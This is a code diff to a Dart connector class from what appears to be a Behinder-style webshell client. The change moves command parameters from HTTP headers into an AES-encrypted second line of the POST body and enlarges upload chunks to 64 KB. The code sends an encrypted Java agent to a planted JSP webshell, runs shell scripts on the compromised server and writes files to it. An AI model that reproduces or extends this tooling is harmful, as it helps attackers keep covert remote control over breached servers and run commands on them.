@@ -38,20 +38,7 @@ class JspBehinderConnector extends ShellConnector {
   /// 冰蝎密钥：支持两种格式
   /// 1. 16 位十六进制（如 e45e329feb5d925b）→ 直接作为密钥，用于匹配 payload 中的 String k="xxx"
   /// 2. 其他 → 视为连接密码，密钥 = MD5(password)[0:16]
-  String get _aesKey => BehinderCrypto.deriveKey(webshell.password);
-
-  static bool _isHex32(String s) {
-    if (s.length != 32) return false;
-    for (var i = 0; i < 32; i++) {
-      final c = s.codeUnitAt(i);
-      if (!((c >= 0x30 && c <= 0x39) ||
-          (c >= 0x61 && c <= 0x66) ||
-          (c >= 0x41 && c <= 0x46))) {
-        return false;
-      }
-    }
-    return true;
-  }
+  String get _key => BehinderCrypto.deriveKey(webshell.password);
 
   @override
   Set<ConnectorCapability> get capabilities => const {
@@ -92,35 +79,18 @@ class JspBehinderConnector extends ShellConnector {
   ) {
     final h = <String, String>{
       'Content-Type': 'application/octet-stream',
-      'X-A': action,
     };
     if (_cookies.isNotEmpty) {
       h['Cookie'] = _cookies.entries
           .map((e) => '${e.key}=${e.value}')
           .join('; ');
     }
-    for (final e in extraParams.entries) {
-      if (e.key == '_k') {
-        h['X-K'] = e.value;
-      } else if (e.key == 'path') {
-        h['X-Path'] = e.value;
-      } else if (e.key == 'path_b64') {
-        h['X-Path-B64'] = e.value;
-      } else if (e.key == 'data') {
-        h['X-Data'] = e.value;
-      } else if (e.key == 'blk') {
-        h['X-Blk'] = e.value;
-      } else if (e.key == 'bsz') {
-        h['X-Bsz'] = e.value;
-      } else if (e.key.length == 32 && _isHex32(e.key)) {
-        h['X-V'] = e.value;
-      }
-    }
+    // 参数全部在 body 第二行，不再走 Header（兼容旧 Agent 的回退保留在 M.java 中）
     return h;
   }
 
   String _aesEncryptBase64(Uint8List plain) {
-    final key = enc.Key(Uint8List.fromList(utf8.encode(_aesKey)));
+    final key = enc.Key(Uint8List.fromList(utf8.encode(_key)));
     final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.ecb));
     final encrypted = encrypter.encryptBytes(plain);
     return base64.encode(encrypted.bytes);
@@ -146,6 +116,14 @@ class JspBehinderConnector extends ShellConnector {
     }
   }
 
+  /// AES-128-ECB 加密参数字符串 → Base64（用于 POST body 第二行）。
+  String _encryptParamsB64(String params) {
+    final key = enc.Key(Uint8List.fromList(utf8.encode(_key)));
+    final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.ecb));
+    final encrypted = encrypter.encryptBytes(utf8.encode(params));
+    return base64.encode(encrypted.bytes);
+  }
+
   Future<String> _sendBehinder(
     String action, {
     Map<String, String> extraParams = const {},
@@ -156,11 +134,18 @@ class JspBehinderConnector extends ShellConnector {
       final agentBytes = await _getAgentBytes();
       if (agentBytes.isEmpty) return '[Error] jsp_agent_M.b64 未找到';
 
-      // 发送纯净单行 Base64 载荷，不带换行符，防止 readLine() 意外截断
+      // 第一行：AES 加密的 Agent class（JSP shell 读取）
       final b64Payload = _aesEncryptBase64(
         agentBytes,
       ).replaceAll('\n', '').replaceAll('\r', '');
-      final bodyBytes = utf8.encode(b64Payload);
+
+      // 第二行：AES 加密的参数（Agent 自己读取）
+      final allParams = <String, String>{'a': action, ...extraParams};
+      final paramsStr = allParams.entries
+          .map((e) => '${Uri.encodeComponent(e.key)}=${Uri.encodeComponent(e.value)}')
+          .join('&');
+      final b64Params = _encryptParamsB64(paramsStr).replaceAll('\n', '').replaceAll('\r', '');
+      final bodyBytes = utf8.encode('$b64Payload\n$b64Params');
 
       final uri = Uri.parse(webshell.url);
       final headers = _requestHeaders(action, extraParams);
@@ -185,9 +170,9 @@ class JspBehinderConnector extends ShellConnector {
         // 标准 Behinder JSP Agent：base64(AES/ECB(json)) 纯 ASCII
         // → aes_with_magic 协议：base64(AES/ECB(json)) + magic tail
         // → Matrix 旧版：base64(AES/ECB 纯文本) 或 明文
-        final decrypted = BehinderCrypto.tryDecryptJsp(body, _aesKey) ??
-            BehinderCrypto.tryDecryptJspWithMagic(response.bodyBytes, _aesKey) ??
-            BehinderCrypto.tryDecryptLegacyMatrix(body, _aesKey);
+        final decrypted = BehinderCrypto.tryDecryptJsp(body, _key) ??
+            BehinderCrypto.tryDecryptJspWithMagic(response.bodyBytes, _key) ??
+            BehinderCrypto.tryDecryptLegacyMatrix(body, _key);
         if (decrypted != null) return BehinderCrypto.extractResponse(decrypted);
         return body;
       }
@@ -257,14 +242,7 @@ class JspBehinderConnector extends ShellConnector {
     return {'path': path};
   }
 
-  static int _pathHeaderCharBudget(String path) {
-    final m = _pathHeadersForNative(path);
-    if (m == null) return 99999;
-    if (m.containsKey('path_b64')) return m['path_b64']!.length;
-    return m['path']!.length;
-  }
-
-  /// 冰蝎 exec 把脚本放在 [X-V]；Dart [http] 要求头值为合法字段，**不能含非 ASCII**。
+  /// 冰蝎 exec 脚本编码：非 ASCII 时用 base64 包装，经 shell 解码后交给 `/bin/sh`。
   /// 含中文等时整段脚本 UTF-8→Base64，经 shell 解码后交给 `/bin/sh`（与上传 exec 回退一致）。
   static String _execScriptForXvHeader(String script) {
     if (!_hasNonAscii(script)) return script;
@@ -449,21 +427,14 @@ class JspBehinderConnector extends ShellConnector {
     return writeFileBinaryWithProgress(path, bytes, (_, _) {});
   }
 
-  /// exec 回退路径：小块，保证 X-V 不超 Tomcat 头限制
-  static const _kChunkSize = 4 * 1024;
+  /// exec 回退路径：参数在 body 第二行，不再受 Header 8KB 限制。
+  static const _kChunkSize = 64 * 1024;
 
   /// 与 Behinder 类似：Session + FileChannel 并行分块（见 docs/jsp_upload_behinder_analysis.md）
   static const _kWpartParallelism = 8;
 
-  static const _kNativeWriteHeaderBudget = 7200;
-
-  int _maxNativeWriteB64Chars(String path) {
-    const fixedOverhead = 480;
-    return (_kNativeWriteHeaderBudget -
-            _pathHeaderCharBudget(path) -
-            fixedOverhead)
-        .clamp(1200, 6200);
-  }
+  /// wpart 单块最大 raw 字节数：参数在 body 第二行，无 Header 长度限制。
+  static const _kMaxWpartBlockSize = 64 * 1024;
 
   Future<void> _wcloseRemoteFile(String target) async {
     final ph = _pathHeadersForNative(target);
@@ -504,9 +475,7 @@ class JspBehinderConnector extends ShellConnector {
     void Function(int sent, int total) onProgress,
   ) async {
     final total = bytes.length;
-    final maxB64 = (_maxNativeWriteB64Chars(target) - 96).clamp(600, 6200);
-    var blockSize = (maxB64 * 3 ~/ 4) - 24;
-    blockSize = blockSize.clamp(512, 4096);
+    final blockSize = math.min(_kMaxWpartBlockSize, total).clamp(512, _kMaxWpartBlockSize);
     final blockCount = (total + blockSize - 1) ~/ blockSize;
 
     await _sendBehinder('ping');
@@ -573,17 +542,15 @@ class JspBehinderConnector extends ShellConnector {
       return r.trim().endsWith('1');
     }
 
-    if (pathHdr != null) {
+    if (pathHdr != null && bytes.length <= _kMaxWpartBlockSize) {
       final dataB64 = base64.encode(bytes);
-      if (dataB64.length <= _maxNativeWriteB64Chars(target)) {
-        final r = await _sendBehinder(
-          'write',
-          extraParams: {...pathHdr, 'data': dataB64},
-        );
-        if (r.trim() == '1') {
-          onProgress(total, total);
-          return true;
-        }
+      final r = await _sendBehinder(
+        'write',
+        extraParams: {...pathHdr, 'data': dataB64},
+      );
+      if (r.trim() == '1') {
+        onProgress(total, total);
+        return true;
       }
     }
 
